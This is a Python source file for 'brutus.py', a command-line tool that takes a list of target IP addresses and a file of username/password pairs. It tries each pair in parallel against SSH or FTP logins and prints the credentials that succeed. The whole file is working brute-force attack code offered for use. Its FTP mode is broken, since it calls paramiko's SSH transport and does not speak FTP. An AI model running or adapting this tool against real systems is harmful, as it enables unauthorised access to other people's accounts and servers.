#!/usr/bin/python3
"""
Usage:
  brutus.py -h | --help
  brutus.py (--rhosts=<rhosts> --credentials=<credentials> --service=<service>)
 
Options:
  --rhosts=<rhosts>             Single ip per line
  --credentials=<credentials>   Credentials file space seperate user/pass per line
  --service=<service>           SSH or FTP
"""

import json
import random
import ipaddress
import paramiko
import concurrent.futures
from docopt import docopt


def parse_rhosts_file(rhosts_file):
    """
    Parse rhosts file and create a list.

    Arguments:
        rhosts_file:    file of ip address one per line
    """
    print("parsing rhosts file: {}".format(rhosts_file))
    rhosts = []
    with open(rhosts_file, "r") as file:
        for line in file:
            ip = line.strip("\n")
            try:
                ipaddress.ip_address(ip)
                rhosts.append(ip)
            except Exception:
                print("ip addres not valid: {}".format(ip))
                pass
    print(rhosts)
    return rhosts

def format_credentials(credentials_file):
    """
    Create a dictionary holding the users with passwords.

    Arguments:
        credentials_file:   The source file passed into the cli tool
    """
    print("Formating credentials into a dict from source file: {}".format(credentials_file))
    credentials = []
    with open(credentials_file, "r") as file:
        for line in file:
            creds = line.strip("\n")
            credentials.append(creds)
    print(credentials)
    return credentials

def ssh_test(creds, ip, port=22, timeout=2):
    """
    Test user login.
    
    Arguments:
        username:       username to test
        password:   password for the user
    
    Return:
        Returns True for success False for failure and the server ip
    """
    username = creds.split(" ")[0]
    password = creds.split(" ")[1]
    try:
        client = paramiko.SSHClient()
        client.load_system_host_keys()
        client.set_missing_host_key_policy(paramiko.WarningPolicy)
        client.connect(ip, port=port, username=username, password=password, timeout=5)
        client.close()
        print("login succeeded on {} with user {} and password {}".format(ip, username, password))
        return {"ip": ip, "username": username, "password": password}
    except Exception:
        print("failed to login to {} with user {} and password {}".format(ip, username, password))
        return False

def ftp_test(creds, ip, port=21, timeout=2):
    """
    Test user login.
    
    Arguments:
        testuser:       username to test
        testpassword:   password for the user
    
    Return:
        Returns True for success False for failure and the server ip
    """
    username = creds.split(" ")[0]
    password = creds.split(" ")[1]
    try:
        t = paramiko.Transport((ip, port))
        t.connect(username=username, password=password, timeout=5)
        print("login succeeded on {} with user {} and password {}".format(ip, username, password))
        return {"ip": ip, "username": username, "password": password}
    except Exception:
        print("failed to login to {} with user {} and password {}".format(ip, username, password))
        return False

def concurrent_login_attempts(service, credentials, rhosts):
    """
    currently run login attempts for a service

    Arguments:
        method:             The method for the desired service
        credential_file:    A dictionary of credentials
    """
    print("running concurrent login attampts for service {}".format(service))
    results_list = {}
    
    with concurrent.futures.ProcessPoolExecutor(max_workers=75) as pool:
        for ip in rhosts:
            if service.lower() == "ssh":
                results = {pool.submit(ssh_test, creds, str(ip)):creds for creds in credentials}
            elif service.lower() == "ftp":
                results = {pool.submit(ftp_test, creds, str(ip)):creds for creds in credentials}
            for future in concurrent.futures.as_completed(results):
                if future.result():
                    attempt_id = random.randint(1,100000)
                    results_list[attempt_id] = future.result()
    return results_list

def main():
    opts = docopt(__doc__)

    rhosts = parse_rhosts_file(opts['--rhosts'])
    credentials = format_credentials(opts['--credentials'])
    results = concurrent_login_attempts(opts['--service'], credentials, rhosts)
    print(json.dumps(results, indent=4, sort_keys=True))

if __name__ == '__main__':
    main()
